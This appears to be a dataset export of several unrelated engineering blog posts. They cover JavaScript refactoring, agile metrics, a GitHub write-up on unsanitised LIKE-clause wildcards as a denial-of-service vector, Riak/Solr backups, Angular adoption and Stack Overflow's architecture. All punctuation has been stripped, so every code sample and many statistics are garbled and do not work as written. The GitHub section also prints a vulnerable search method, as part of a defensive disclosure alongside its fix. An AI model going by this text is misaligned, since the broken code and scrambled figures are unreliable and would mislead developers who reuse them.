paying attention to the changes your dependencies have gone through  Some projects might work with fixed versions  e g  v1 12 5    while others use wildcard versions  e g  v1 12 x    In case you need a quick update  a version number is constructed as follows  MAJOR MINOR PATCH   If you aren t familiar with how semantic versioning works  I recommend reading this article by Tim Oxley   There is no general rule for updating dependencies  Each project is different and should be handled as such  Updating the PATCH number of your dependencies shouldn t be a problem at all  and MINOR is usually fine too  Only when you bump the MAJOR number of your dependencies  you should look up what exactly has changed  Maybe the API has changed entirely and you need to rewrite large parts of your application  If that s not worth the effort  I would avoid updating to the next major version   If your project uses npm as dependency manager  and there aren t any competitors  you can check for any outdated dependencies with the handy npm outdated command from your CLI  Let me illustrate this with an example from one of my projects called FrontBook  where I frequently update all dependencies   As you can see I have a lot of major updates here  I wouldn t update all of them at once  but one at a time  Granted  this will take up a lot of time  yet it is the only way to ensure nothing breaks  if the project doesn t have any tests    Let s Get Our Hands Dirty  The main message I want you to take with you is that cleaning up doesn t necessarily mean removing and rewriting large sections of code  Of course  this is sometimes the only solution but it shouldn t be your first and only step  JavaScript can be an odd language  hence giving generic advice is usually not possible  You always have to evaluate your specific situation and figure out a working solution   Establish Unit Tests  Having unit tests ensures you understand how the code is intended to work and you don t accidentily break anything  JavaScript unit testing is worth its own articles  so I won t be able to go much into detail here  Widely used frameworks are Karma  Jasmine  Mocha or Ava  If you also want to test your user interface  Nightwatch js and DalekJS are recommended browser automation tools   The difference between unit testing and browser automation is  that the former tests your JavaScript code itself  It ensures all your modules and general logic work as intended  Browser automation  on the other hand  tests the surface   the user interface   of your project  making sure elements are in the right place and work as expected   Take care of unit tests before you start refactoring anything else  The stability of your project will improve  and you haven t even thought about scalability  A great side effect is not being worried all the time that you might have broken something and didn t notice   Rebecca Murphey as written an excellent article on writing unit tests for existing JavaScript   Architecture  JavaScript architecture is another huge topic  Refactoring and cleaning up the architecture boils down to how much experience you have with doing that  We have a lot of different design patterns in software development  but not all of them are a good fit where scalability is concerned  Unfortunately I won t be able to cover all of the cases in this article  but can at least give you some general advice   First of all  you should figure out which design patterns are already used in your project  Read up about the pattern  and ensure it s consistent  One of the keys to scalability is sticking to the pattern  and not mixing methodologies  Of course  you can have different design patterns for different purposes in your project  e g  using the Singleton Pattern for data structures or short namespaced helper functions  and the Observer Pattern for your modules  but should never write one module with one pattern  and another one with a different pattern   If there isn t really any architecture in your project  maybe everything is just in one huge app js    it s time to change that  Don t do it all at once  but piece by piece  Again  there is no generic way to do things and every project setup is different  Folder structures varies between projects  depending on the size and complexity  Usually   on a very basic level   the structure is split up into third party libraries  modules  data and an entry point  e g  index js   main js   where all your modules and logic gets initialized   This leads me to modularization   Modularize Everything   Modularization is by far not the answer to the great JavaScript scalability question  It adds another layer of API that developers have to get familiar with  This can be worth the hassle though  The principle is splitting up all your functionality in to tiny modules  By doing that  it is easier to solve problems in your code and to work in a team on the same codebase  Every module should have exactly one purpose and task to do  A module doesn t know about the outside logic of your application  and can be reused in different locations and situations   How do you split up a large feature with lots of tightly connected logic  Let s do this together      This example uses the Fetch API to request an API  Let s assume    that it returns a JSON file with some basic content  We then create a    new element  count all characters from some fictional content    and insert it somewhere in your UI  fetch  https   api somewebsite io post 61454e0126ebb8a2e85d     method   GET      then response      if  response status     200    return response json          then json      if  json    Object keys json  forEach key      const item   json key   const count   item content trim   replace   s  gi      length  const el      div class  foo   item className     p Total characters    count   p    div     const wrapper   document querySelector   info element    wrapper innerHTML   el            catch error    console error error     This is not very modular  Everything is tightly connected and dependent on the other pieces  Imagine this with larger  more complex functions and you would have to debug this because something breaks  Maybe the API doesn t respond  something changed inside of the JSON or whatever  A nightmare  isn t it   Let s separate out the different responsibilities      In the previous example we had a function that counted    the characters of a string  Let s turn that into a module  function countCharacters  text    const removeWhitespace     s  gi  return text trim   replace removeWhitespace      length       The part where we had a string with some markup in it     is also a proper module now  We use the DOM API to create    the HTML  instead of inserting it with a string  function createWrapperElement  cssClass  content    const className   cssClass     default   const wrapperElement   document createElement  div    const textElement   document createElement  p    const textNode   document createTextNode  Total characters    content     wrapperElement classList add className   textElement appendChild textNode   wrapperElement appendChild textElement   return wrapperElement       The anonymous function from the  forEach   method     should also be its own module  function appendCharacterCount  config    const wordCount   countCharacters config content   const wrapperElement   createWrapperElement config className  wordCount   const infoElement   document querySelector   info element    infoElement appendChild wrapperElement      Alright  we have three new modules now  Let s see the refactored fetch call   fetch  https   api somewebsite io post 61454e0126ebb8a2e85d     method   GET      then response      if  response status     200    return response json          then json      if  json    Object keys json  forEach key    appendCharacterCount json key          catch error    console error error     We could also take the logic from inside the  then   methods and separate that  but I think I have demonstrated what modularization means   If  modularization What Else   As I already mentioned  turning your codebase in tiny modules adds another layer of API  If you don t want that  but want to keep it easier for other developers to work with your code  it s absolutely fine to keep functions larger  You can still break down your code into simpler portions and focus more on testable code   Document Your Code  Documentation is a heavily discussed topic  One part of the programming community advocates for documenting everything  while another group thinks self documenting code is the way to go  As with most things in life  I think a good balance of both makes code readable and scalable  Use JSDoc for your documentation   JSDoc is an API documentation generator for JavaScript  It is usually available as a plugin for all well known editors and IDE s  Let s go through an example   function properties  name  obj         if   name  return  const arr       Object keys obj  forEach key      if  arr indexOf obj key  name       1    arr push obj key  name          return arr     This function takes two parameters and iterates over an object  which then returns an array  This might not be an overly complicated method  but for someone who hasn t written the code it might take a while to figure out what is going on  Additionally  it s not obvious what the method does  Let s start documenting         Iterates over an object  pushes all properties matching  name  into   a new array  but only once per occurance     param  String  propertyName   Name of the property you want    param  Object  obj   The object you want to iterate over    return  Array     function getArrayOfProperties  propertyName  obj         if   propertyName  return  const properties       Object keys obj  forEach child      if  properties indexOf obj child  propertyName       1    properties push obj child  propertyName          return properties     I haven t touched much of the code itself  Just by renaming the function and adding a short  yet detailed comment block  we ve improved the readability   Have An Organized Commit Workflow  Refactoring is a huge mission on its own  To be able to always rollback your changes  in case you break something and only notice later   I recommend committing every update you make  Rewrote a method  git commit  or svn commit   if you work with SVN   Renamed a namespace  folder or a few images  git commit   You get the idea  It might be tedious for some people to do  but it really helps you clean up properly and get organized   Create a new branch for the entire refactoring effort  Don t ever work on master  You may have to do quick changes or upload bug fixes to the production environment and you don t want to deploy your  maybe untested  code until it is tested and finished  Hence it is advised to always work on a different branch   In case you need short update how all this works  there is an interesting guide from GitHub on their version control workflow   How To Not Lose Your Mind  Besides all the technical steps required for a clean up  there is one important step I rarely see mentioned anywhere  not being mad at the previous developer  Of course  this doesn t apply to everyone  but I know that some people experience this  It took me years to really understand this and get over it  I used to get pretty mad at the previous developers code  their solutions and just why everything was such a mess   In the end  all that negativity never got me anywhere  It only results in you refactoring more than necessary  wasting your time  and maybe breaking things  This just makes you more and more annoyed  You might spend extra hours and nobody will ever thank you for rewriting an already working module  It s not worth it  Do what is required  analyse the situation  You can always refactor tiny bits every time you go back to a module   There are always reasons why code is written the way it is  Maybe the previous developer just didn t have enough time to do it properly  didn t know better  or whatever  We have all been there   Wrapping It Up  Let s go over all steps again  to create a checklist for your next project   Analyse the project  Put your developer hat away for a moment  and be a user to see what it s all about   Go through the codebase and make a list of the tools in use   Read up documentation and best practices of the tools   Go through the unit tests to get a feeling for the project on a higher level   Create a baseline  Introduce  editorconfig to keep the coding style guides consistent between different IDEs   to keep the coding style guides consistent between different IDEs  Make indentation consistent  tabs or spaces  doesn t matter   Enforce a naming convention   If not already present  add a linter like ESLint  JSLint  or JSHint   Update dependencies  but do it wisely and watch out for what exactly has been updated   Cleaning up  Establish unit tests and browser automation with tools like Karma  Jasmine  or Nightwatch js   Make sure the architecture and design pattern are consistent   Don t mix design patterns  stick to the ones already there   Decide if you want to split up your codebase into modules  Each should only have one purpose and be unaware of the rest of your codebase logic   If you don t want to do that  focus more on testable code and break it down into simpler blocks   Document your functions and code in a balanced way with properly named functions   Use JSDoc to generate documentation for your JavaScript   Commit regularly and after important changes  If something breaks  it s easier to go back   Don t lose your mind  Don t get mad at the previous developer  negativity will only result in unnecessary refactoring and wasting time   There have been reasons why code is written like it is  Keep in mind that we ve all been there   I really hope this article has helped you  Let me know if you struggle with any of the steps  or maybe have some good advice that I didn t mention 
41,engineering,Redirecting 
42,engineering,How One Jira Ticket Made My Employer  1MMThe essence of agile is the continual process of improving efficiency   This is the only thing you really need to know about agile in order to put it to  productive  work in your organization  You should value   Individuals and interactions over processes and tools  Working software over comprehensive documentation  Customer collaboration over contract negotiation  Responding to change over following a plan  If that doesn t look familiar  you really need to read this   I ll add some more of my favorite dev team values   Skills over titles  Continuous delivery over deadlines  Support over blame  Collaboration over competition  Why is your team s agile process so dysfunctional  Chances are you re losing track of those values  and you re trying to cram the same old chaotic waterfall into agile trappings like scrum meetings and retrospectives   Face to face scrum meetings can be counter productive because they encourage competition over collaboration  employees compare themselves to each other   blame over support  deadlines over continuous delivery   we have to close x tickets before Friday or we ll have to work the weekend     and a pecking order that infects a team like cancer   Where in the agile manifesto does it say   stand up for 15 minutes every day and feel slow shamed because the coder across from you finished 6 tickets yesterday and you only finished one    There s always the obnoxious over achiever who comes in early and goes home late every day  and closes 2x as many tickets as the rest of the team  Note  almost always a relatively inexperienced  but super eager and super impressive  Too bad they re slowing down the rest of the team   Likewise  there s always the slow poke who closes one or two tickets  Odd  They re a great mentor  and they re always chiming in on other people s tickets  helping them get unstuck  teaching  and giving great advice  They should be able to close 10x as many tickets as the rest of us  right  They must simply be terrible at time management   Hint  They re not  You just suck at evaluating employees    Ticket counting and  velocity tracking  are the worst ideas in software development management since waterfall chaos   Forget Counting Tickets  Forget points  Forget estimates and commitments  Estimates are all worthless lies  Try weekly demos  instead  Get the marketing team to hype the features you finished last month  not the features you think you might be able to finish next month   Build yourself a good feature toggle and marketing release management system and you can still release features according to a marketing hype schedule  but you ll be hyping finished features  and your team will never have to burn out on night   weekend crunch times again   Tip  Your marketing and sales teams should never be allowed to discuss features  in the pipeline   and your sales   biz dev teams should never be able to commit to a deadline without a really flexible MVP  minimum viable product  plan  When I say flexible  I mean flexible   e g   Elon Musk is taking us to Mars  Initial sales MVP  get a balloon into the clouds   Engineering estimates are usually wrong by orders of magnitude  but nobody wants to face up to that fact and deal in reality   What Should We Measure   The only thing that matters in software development is that the users love your software   Everything else in this list serves that purpose  Remember that  Now bring on the real metrics   The first 5 of these metrics are all essential business key performance indicators  KPIs  for nearly every app developer   You re going to wonder why I m sharing these with a bunch of developers and telling you that these are the metrics you need to focus on  but bear with me  The remaining metrics will clear that up for you   1  Revenue  None of the other metrics mean a damn thing if you go broke  If you run out of fuel  it s game over  You re done  Pack up your office and go home   Core Tactics   Conversion rate optimization  Crawlable content  Sharable content  Page load   perf  Optimize to keep the lights on   2  Monthly Active Users  MAU   Do you have any users  Do you have more than last month  If you re a venture funded startup  you d better pray you re growing fast enough  In the beginning you can double month over month if you work hard  Of course  all hockey stick curves are really S curves in disguise  but chances are good you have plenty of room left to grow   Core Tactics   Page load   perf  Sharable content  TDD   code review  Optimize for growth   3  Net Promoter Score  NPS   Remember when I said if you run out of fuel  it s game over  I tricked you  didn t I  You thought I was talking about money   Money isn t your fuel  Fans are your fuel   Fans are the key to unlocking more money  More sharing  More growth  More joy  More magic   Core Tactics   TDD   code review  Page load   perf  Collaboration with support   QA staff  Optimize to turn users into evangelists   4  Viral Factor  Also known as k factor or viral quotient  If you re not measuring this  start right now   k   i   c  i   number of invites  e g   shares  per user  c   conversion rate per share  k   1 is steady  No growth  No decline   k   1 means exponential growth   k   1 means exponential decline   You should have a giant screen in the middle of the office with a k factor gauge in bright red for  1  green for  1  overlaid on your 3 month MAU growth chart   Core Tactics   Sharable content  Integrate sharing into core product  Conversion rate optimization  Page load   perf  Optimize for sharing and new visitor conversion   5  Support tickets  Nothing says  this garbage is broken  like an email to customer support  When was the last time somebody contacted support just to tell you how cool you are   Support tickets are your canary in the coal mine  When somebody says something is broken  don t think   it works for me    Even if it s user error  it s not user error  Chances are there s a flaw in the design and 1 000 other people are bothered by it too  1 000 other people for every one person who cares enough to write you and complain  1 000 people who d rather hit the back button than waste their time on your app for one more second   Ideally  you should aim for zero support tickets  You ll never reach that metric  if you re lucky   but you should consider every support ticket to be a bug report  Start categorizing the common ones  Count them and use them to prioritize fixes   I m not saying the customer is always right  Sometimes customers don t know what they want until you give it to them  I am saying that if it s in your inbox  you re doing something wrong   Core Tactics   TDD   code review  CI CD  Feature toggle   rollout  Periodic bug burndown hackathons  Collaboration with support   QA staff  Optimize for problem free customer experience   Key Engineering Focus Metrics  As promised  The keys to unlocking the mysteries of the business KPIs  As it turns out  you can move all of the above needles a lot with two levers   6  Bug Count  Here s a shock  Some ticket counts are good for something  Be careful to categorize all the bug tickets as bugs  and then you can see a bug count   All software has bugs  but not all bugs need fixing  If a bug appears only on an ancient phone  and that phone is only used by one user of your software  and that user isn t even a paying customer  do you need to fix that bug  Probably not  Close it and move on  Prioritize the bugs that are hurting your users the most   Get busy and squash them   Core Tactics   TDD   code review  Periodic bug burndown hackathons  Collaboration with support   QA staff  Optimize for a bug free experience   7  Performance  I m cheating a little this time  This one is going to contain 3 more critical metrics   Load time  The time it takes for your app to be usable after the user clicks the icon or hits your URL  Aim for  1 second  Beyond that  you lose users  Every ms you can trim off load time comes with measurable benefits to every metric above  Response time  The time from user action  like a click  to a visible response in the application  Aim for  100ms  Any more than that feels like lag  Animation time  The maximum time it takes to draw one animation frame  Aim for 10ms  Any more than 16 ms will cause noticeable jank  and may even make the user feel a bit queasy  You ll need a little breathing room for this one  Keep it under 10ms   Load time is by far the most important mini metric in this list  It will move the business KPI needles like nothing else I ve mentioned  But response time and smooth animations cause a magical side effect  Users are happier after using your app  You see  every little janky glitch  every little delayed response feels jarring to users on an almost subconscious level   Give the same user the same app with performance issues fixed  and they report much higher satisfaction ratings  even if they can t put their finger on why   Our little secret   Core Tactics   Periodic performance hackathons  In depth performance audits  10ms  100ms  1000ms  repeat  Optimize for a jank free experience   There s A Lot More To It  Of course  this little rant can t go into great depth on how developers can directly manipulate viral factor and MAU numbers  but I ll leave you with a hint  You can  And when those numbers are staring you in the face every day  and you know that it s your job to move them   not management s job  not marketing s job   your job  I m sure you ll come up with some creative ideas to make it happen   If your manager thinks you have better things to do  send them this link   Now go out there and move the needle on some metrics that actually matter 
43,engineering,GitHub EngineeringLooking through our exception tracker the other day  I ran across a notice from our slow query logger that caught my eye  I saw a SELECT   WHERE   LIKE query with lots of percent signs in the LIKE clause  It was pretty obvious that this term was user provided and my first thought was SQL injection     3   92 sec   SELECT     WHERE   profiles   email LIKE   64 68 6f 6d 65 73  67 6d 61 69 6c  63 6f 6d     LIMIT 10  Looking at the code  it turned out that we were using a user provided term directly in the LIKE clause without any checks for metacharacters that are interpreted in this context       _         def self   search   term   options       limit     options    limit      30    to_i friends   options    friends         with_orgs   options    with_orgs    nil    false   options    with_orgs   if term   to_s   index         users   User   includes    profile     where    profiles email LIKE           term          limit   limit    to_a else users   user_query   term   friends  friends   limit  limit   end       end  While this isn t full blown SQL injection  it got me thinking about the impact of this kind of injection  This kind of pathological query clearly has some performance impact because we logged a slow query  The question is how much   I asked our database experts and was told that it depends on where the wildcard is in the query  With a   in the middle of a query  the database can still check the index for the beginning characters of the term  With a   at the start of the query  indices may not get used at all  This bit of insight led me to run several queries with varied   placement against a test database   mysql   SELECT 1 FROM  profiles  WHERE  email  LIKE  chris github com    1 row in set   0   00 sec   mysql   SELECT 1 FROM  profiles  WHERE  email  LIKE   ris github com    1 row in set   0   91 sec   mysql   SELECT 1 FROM  profiles  WHERE  email  LIKE  chris github     1 row in set   0   00 sec   mysql   SELECT 1 FROM  profiles  WHERE  email  LIKE   c h r i s   g i t h u b   c o m     21 rows in set   0   93 sec    It seems that unsanitized user provided LIKE clauses do have a potential performance impact  but how do we address this in a Ruby on Rails application  Searching the web  I couldn t find any great suggestions  There are no Rails helpers for escaping LIKE metacharacters  so we wrote some   module LikeQuery   Characters that have special meaning inside the  LIKE  clause of a query          is a wildcard representing multiple characters     _  is a wildcard representing one character        is used to escape other metacharacters  LIKE_METACHARACTER_REGEX         _      What to replace  LIKE  metacharacters with  We want to prepend a literal   backslash to each metacharacter  Because String gsub does its own round of   interpolation on its second argument  we have to double escape backslashes   in this String  LIKE_METACHARACTER_ESCAPE         1    Public  Escape characters that have special meaning within the  LIKE  clause   of a SQL query      value   The String value to be escaped      Returns a String  def like_sanitize   value   raise ArgumentError unless value   respond_to     gsub   value   gsub   LIKE_METACHARACTER_REGEX   LIKE_METACHARACTER_ESCAPE   end extend self module ActiveRecordHelper   Query for values with the specified prefix      column   The column to query    prefix   The value prefix to query for      Returns an ActiveRecord  Relation def with_prefix   column   prefix   where        column   LIKE           LikeQuery   like_sanitize   prefix          end   Query for values with the specified suffix      column   The column to query    suffix   The value suffix to query for      Returns an ActiveRecord  Relation def with_suffix   column   suffix   where        column   LIKE            LikeQuery   like_sanitize   suffix         end   Query for values with the specified substring      column   The column to query    substring   The value substring to query for      Returns an ActiveRecord  Relation def with_substring   column   substring   where        column   LIKE            LikeQuery   like_sanitize   substring          end end end  ActiveRecord    Base   extend LikeQuery ActiveRecord    Base   extend LikeQuery    ActiveRecordHelper  We then went through and audited all of our LIKE queries  fixing eleven such cases  The risk of these queries turned out to be relatively low  A user could subvert the intention of the query  though not in any meaningful way  For us  this was simply a Denial of Service  DoS  vector  It s nothing revolutionary and it is not a new vulnerability class  but it s something to keep an eye out for  Three second queries can be a significant performance hit and application level DoS vulnerabilities need to be mitigated 
44,engineering,Strachey Lecture   Probabilistic machine learning  foundations and frontiersProbabilistic modelling provides a mathematical framework for understanding what learning is  and has therefore emerged as one of the principal approaches for designing computer algorithms that learn from data acquired through experience  Professor Ghahramani will review the foundations of this field  from basics to Bayesian nonparametric models and scalable inference  He will then highlight some current areas of research at the frontiers of machine learning  leading up to topics such as probabilistic programming  Bayesian optimisation  the rational allocation of computational resources  and the Automatic Statistician   The Strachey lectures are generously supported by OxFORD Asset Management 
45,engineering,This is strictly a violation of the TCP specification   Idea of the daytotally not insane  This is strictly a violation of the TCP specification  I ve published an article on the CloudFlare blog 
46,engineering,How to Back Up Riak and Solr DataNote  This is the second of three engineering blog posts from Brad Culberson one of our highest ranking engineers here at SendGrid  If you re interested in reading more posts like this  check out his first post here or view our technical blog roll   SendGrid is using Riak and Solr for the Marketing Campaigns contacts dataset  We built a disaster recovery plan that protects that dataset from corruption unintentional deletion data center loss  This is a challenging task due to the size and growth of that data  We re currently storing approximately 2TB of key value data and 18TB of Solr index data   We evaluated several solutions that could have solved the problem   Riak ring replication File system backups Data extraction Kafka log backups  Riak ring replication  In order to vet this solution  we built a disaster recovery ring and began a full sync  After tuning  we were able to get a full sync to complete within 48 72 hours  This solution is quite simple as we already pay Basho for replication licensing and have the replication tools on the servers  A negative effect of this solution is that any time we may have a data center loss or ring loss we could have lost up to 72 hours of data depending on where in the process the full sync was  Basho also has a real time sync  That does couple the two rings together on every write something we did not want  The other negative result of this solution is that depending on what causes the  disaster   many scenarios could also corrupt the replication cluster   To find out more about Riak replication  read their docs   File system backups  Backing up the file system is a common approach  This would have worked  but our biggest concern was the disk IO necessary to read and back up 20TB of data and then the compute and resources needed to compress  encrypt  and transfer that data outside the data center  The product goal was to have at least a full weekly and daily incrementals  This solution would have made the fulls possible but we would have needed to do them daily to keep the loss limited  Due to the cost and waste from redundancy included in the backups  we ruled out this option before any implementation   Data extraction  This solution would build an endpoint in our application server that would allow extraction and restore user data  We could then run a job s  in Chronos which iterates all users and performs that data extraction  compresses  encrypts  and shuttles the data to another data center   This was very attractive for a few reasons   We aren t backing up 3x the dataset size based on the n val of the Riak ring  and are not backing up the huge Solr indexes  We can prioritize restores backup recovery per user  No  unknown  technology   This ended up being the best choice for us for the full backups we wanted weekly  We added the endpoint and the Mesos job and scheduled user_id   7 daily so that each day 1 7 of our users are backed up   After analyzing the total recovery time of our ring  we have started to build and share the data to smaller Riak rings using the same technology such that the total recovery of the dataset meets product requirements and only affects a   of our users   This did not solve the incremental backup we desired  but we had an ace up our sleeves for that  Kafka    Kafka log backups  All writes that go through our contacts database go through Kafka  We do that so that we can protect the Riak and Solr cluster from being overloaded and still respond synchronously to requests when we have spikes in updates of the contact data   Since we were using Kafka for all updates  we had the capability to add a consumer to the Kafka topics to transform and shuttle the insert  updates  and deletes off site creating a copy of our transactions off site  If we need to restore the ring  we can then pull the Kafka data based on the user and dates  We rehydrate the Kafka topics with those messages so that our workers will bring the contact dataset up to date  This is a great solution for us because it gives us something which can be used to restore to any point in time and it puts no load on the production Riak Solr cluster for backup  It also uses current code paths so that it is extremely unlikely to break under future development   Look inside the box  In order to back up Riak we were able to rely on our existing development capabilities instead of 3rd party tools which were extremely wasteful  This proved to be very successful as there are no great solutions out of the box to back up Riak Solr   Since all our updates go through an async bus  solving for incremental backups was fairly simple and easy to maintain  If you re running all your updates through a pub sub system like Kafka  consider building your own incremental restores  You already have the developers and the capabilities to subscribe to the bus and the code to process the messages  so I d propose you reuse that knowledge and build your own flexible backup and restore system 
47,engineering,We Have Seriously Underestimated Angular  Telerik Developer NetworkI was putting together the keynote for the upcoming NativeScript Developer Day conference  and I had a slide placeholder in to talk about Angular  NativeScript has supported Angular 2 since it was released in RC at ng conf in May  You can check out our quick 2 minute segment of the keynote where we announced our support   As I was putting together the slides  I thought   What exactly am i going to say about Angular   Hasn t everything already been said  Like 20 times  Instead  I started doing some research into exactly why we chose Angular 2 for NativeScript to begin with   I always thought that it was based off of an email that Brad sent me in February 2015   At that time  NativeScript was already at beta and headed for a full release  May 2015   We had our own binding framework  as well as full support for TypeScript and ES6  I remember thinking   what exactly do we need Angular for    Angular 2 looks complicated  they seem to re write it every 2 weeks and it feels like an uneccessasry tax to pay on JavaScript   I  like so many other people  seriously underestimated Angular   There have been so many articles on React  Angular  blood  guts  and how all JavaScript frameworks are more or less killing us slowly like too much Taco Bell  which  btw  is super unfair because Taco Bell has done a lot to improve the quality of it s food lately   Man  is it easy to just completely drown in the noise  We also tend to forget why we even made certain decisions in the first place  I m not sure how anyone ships anything anymore   I got caught up in this nonsense myself  As it turns out  there are really good reasons why we chose Angular for NativeScript  We could have chosen React  Aurelia  an excellent framework right there  or any number of others  I mean  we could have fully implemented jQuery for NativeScript if we wanted to   But we didn t  We went with Angular  And the reasons why are far bigger than you would expect  Starting with the fact that nobody fully understands the adoption Angular enjoys   Angular Adoption  We knew that we needed to provide an application framework for NativeScript  We still have our own binding solution and vanilla JavaScript model that many developers love  but a great many more need more from NativeScript than just  go nuts with JavaScript   That s where Angular comes in   I don t think anyone would argue that Angular is popular  I just think that nobody really understands how popular it is  Consider this scoped Google Trends graph   When you look at this strictly from the angle of what people are searching for  Angular has nearly twice the adoption of the next highest  I didn t even include any others besides React in the comparison because they are so slight that they are all essentially flat lines on the graph when put up against the behemoths that are jQuery  Angular and React  React is definitely a juggernaut  but it is still half of what Angular is in terms of interest on Google search  Furthermore  at the current pace  Angular will be more popular than jQuery in terms of Google searches by the end of 2017  Let me repeat that in case you didn t fully catch it   Angular will soon be more popular than jQuery   1 3 million people use Angular 1   480k already use Angular 2    David East   _davideast  September 15  2016  That should blow your mind  None of the hype that we hear on a day to day basis would suggest that this is the case  but it is  Don t like my Google trends  OK  let s do another  How about StackOverflow   While the recent 2016 developer survey from StackOverflow shows that React is the trendiest topic  if you look at the tags page  Angular is number 20 down the list with 250 questions asked just today and 1615 this week   React is on page 6 right before the oddly specific  visual studio 2012  tag  with 82 questions asked today and 515 so far this month  That s roughly 1 3 the amount of Angular  This is not a slam on React  React is on a ridiculous upwards trajectory  I m simply trying to point out what real mass adoption looks like   Now I ll be the first to admit that StackOverflow is a certain subset of developers  like the fact that their own survey reports that 4 of the top 10 tech stacks per occupation include either C  or SQL Server  roughly 78   which would indicate that these are primarily enterprise and line of business developers  But who do you think is out there writing 90  of the software everyday  It s line of business developers  not startups in San Francisco  As a side note  guess which other technology shows up in the top 10 tech stacks by occupation  I ll give you a hint  it starts with  A  and ends with  ngular    I m saying all of this to point out that the reason why we selected Angular was in large part based on it s sheer adoption numbers  How do you know when a technology isn t going anywhere anytime soon  When 2 of the top 10 tech stacks by occupation name it specifically instead of just lumping it under  JavaScript   The fine folks on the React Native team nailed this when they said   Learn once  write anywhere   That s exactly right  Why should you have to learn our binding  templating and application patterns when you already know Angular  You shouldn t  That s how people get worn out and fed up with programming  and rightfully so    But Burke  These stats are all Angular 1  Angular 2 is way different and everyone hates it    Good point  You re sharp  That s a fair concern  but also another huge underestimation  Mostly because Angular 1 is Angular 2   Angular 1 Is Angular 2  I didn t realize this until Todd Motto pointed it out to me  but the Angular team has been moving 1 x towards 2 0  If you haven t looked at Angular 1 x in a while  you might not even recognize it  Consider the following simple application component module in Angular 1 x   const AppComponent     template     h1 Root Component  h1       angular  module  app        component  app   AppComponent    Now here is that same thing as a component in Angular 2    import  Component  from   angular core    Component   selector   app   template     h1 Root Component  h1       export class AppComponent     They look ridiculously similar  Aside from some of the newer additions such as the  Component annotation and leveraging an actual module standard  they are virtually identical  Everyone has this idea in their head that Angular 2 and Angular 1 are drastically different  They are  but the team has been very sneaky in the way that they have merged the API of Angular 1 into Angular 2  The leap from one to the other is significantly shorter than anyone thinks   There is also this notion that people don t like Angular 2  That s just simply not the case  Angular 2 has been the most unstable JavaScript framework ever   by an enormous margin  The team over at Google ships breaking changes almost once a month  And yet  look at the State Of JavaScript survey that came out recently which reports that 64  of people are happy with their Angular 2 development experience  What    That s crazy  This is like 64  of people being pleased with a car that consistently leaves them stranded  Imagine how much higher this number will be now that Angular 2 Final has been released   Lastly  there s something here that we haven t even considered yet that causes people to intrinsically want to move to Angular 2 over any other framework out there  and that s TypeScript   TypeScript  TypeScript has been the subject of a lot of consternation for web developers  Why do we need types in JavaScript  What in the name of everything that is holy do interfaces possibly bring to the table for JavaScript developers besides bloat  Why are we trying to complicate something that is so simple to use  Keep your stupid OOP concepts  They aren t welcome in our browsers   The trouble is  those concepts that JavaScript so elegantly eschews are the same ones that are the foundation of solid applications  You know that age old argument about how JavaScript isn t suitable for large applications  That s because large applications require interfaces  some healthy amount of inheritance  gasp  I know  and the myriad of other structures that typed languages enjoy  and yes  modules   Those things were put into languages by really smart people for a reason  Not so that we could just throw them all out in favor of a language that was created in 10 days   There are a lot of developers out there with solid OOP backgrounds in C  and Java that have no interest in just ditching decades of hard learned programming experience  For them  TypeScript opens up the door to a whole world of application development that they otherwise would have little to no interest in  This means that when these developers go looking for a framework to build their TypeScript apps with  they will end up in Angular s front yard like John Cusack in Say Anything   I m sure you already know that Angular 2 is built on and for TypeScript  and so is NativeScript  What you may not know  is that other JavaScript frameworks such as Aurelia  Ember and even Dojo are headed towards TypeScript as well  Regardless of your opinion on TypeScript  it is a phenomenon that is sweeping through the JavaScript community  and it is pulling millions of developers into JavaScript along with it   Be Skeptical But Watch Closely  Nobody can predict the future  And just because this blog post is on the internet does not make it true  If anything  it should make you very skeptical  But skeptical you should be  I m simply suggesting that none of us fully grasp the enormity of Angular and the crushing influence that it has  even if they did decide to re write it from scratch and break everything on the daily   In the end  Angular is far bigger than any of us realize and 2 0 has some aggressive aspirations to be far bigger than just the web  NativeScript is part of that realization  but I don t think we ve seen anything yet   Header image courtesy of Marc Majcher
48,engineering,Stack Overflow  The ArchitectureTo get an idea of what all of this stuff  does   let me start off with an update on the average day at Stack Overflow  So you can compare to the previous numbers from November 2013  here s a day of statistics from February 9th  2016 with differences since November 12th  2013   209 420 973   61 336 090  HTTP requests to our load balancer  HTTP requests to our load balancer 66 294 789   30 199 477  of those were page loads  of those were page loads 1 240 266 346 053   406 273 363 426  bytes  1 24 TB  of HTTP traffic sent  bytes  1 24 TB  of HTTP traffic sent 569 449 470 023   282 874 825 991  bytes  569 GB  total received  bytes  569 GB  total received 3 084 303 599 266   1 958 311 041 954  bytes  3 08 TB  total sent  bytes  3 08 TB  total sent 504 816 843   170 244 740  SQL Queries  from HTTP requests alone   SQL Queries  from HTTP requests alone  5 831 683 114   5 418 818 063  Redis hits  Redis hits 17 158 874  not tracked in 2013  Elastic searches  Elastic searches 3 661 134   57 716  Tag Engine requests  Tag Engine requests 607 073 066   48 848 481  ms  168 hours  spent running SQL queries  ms  168 hours  spent running SQL queries 10 396 073   88 950 843  ms  2 8 hours  spent on Redis hits  ms  2 8 hours  spent on Redis hits 147 018 571   14 634 512  ms  40 8 hours  spent on Tag Engine requests  ms  40 8 hours  spent on Tag Engine requests 1 609 944 301   1 118 232 744  ms  447 hours  spent processing in ASP Net  ms  447 hours  spent processing in ASP Net 22 71   5 29  ms average  19 12 ms in ASP Net  for 49 180 275 question page renders  ms average  19 12 ms in ASP Net  for 49 180 275 question page renders 11 80   53 2  ms average  8 81 ms in ASP Net  for 6 370 076 home page renders  You may be wondering about the drastic ASP Net reduction in processing time compared to 2013  which was 757 hours  despite 61 million more requests a day  That s due to both a hardware upgrade in early 2015 as well as a lot of performance tuning inside the applications themselves  Please don t forget  performance is still a feature  If you re curious about more hardware specifics than I m about to provide fear not  The next post will be an appendix with detailed hardware specs for all of the servers that run the sites  I ll update this with a link when it s live    So what s changed in the last 2 years  Besides replacing some servers and network gear  not much  Here s a top level list of hardware that runs the sites today  noting what s different since 2013    4 Microsoft SQL Servers  new hardware for 2 of them   11 IIS Web Servers  new hardware   2 Redis Servers  new hardware   3 Tag Engine servers  new hardware for 2 of the 3   3 Elasticsearch servers  same   4 HAProxy Load Balancers  added 2 to support CloudFlare   2 Networks  each a Nexus 5596 Core   2232TM Fabric Extenders  upgraded to 10Gbps everywhere   2 Fortinet 800C Firewalls  replaced Cisco 5525 X ASAs   2 Cisco ASR 1001 Routers  replaced Cisco 3945 Routers   2 Cisco ASR 1001 x Routers  new    What do we need to run Stack Overflow  That hasn t changed much since 2013  but due to the optimizations and new hardware 